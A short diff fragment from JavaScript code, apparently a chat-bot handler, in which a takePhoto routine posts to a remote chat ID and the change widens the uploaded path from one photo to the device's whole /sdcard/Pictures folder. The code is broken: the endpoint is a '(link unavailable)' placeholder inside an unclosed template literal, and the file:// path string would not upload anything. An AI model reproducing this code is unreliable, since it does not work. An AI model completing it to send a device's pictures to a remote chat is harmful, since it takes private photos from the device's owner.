@@ -34,7 +34,7 @@ async function takePhoto() {
       sendMessage('Foto berhasil diambil. Sedang dikirim...');
       axios.post(`(link unavailable), {
         chat_id: id,
-        photo: 'file:///sdcard/foto.jpg',
+        photo: 'file:///sdcard/Pictures',
       });
     }
   });
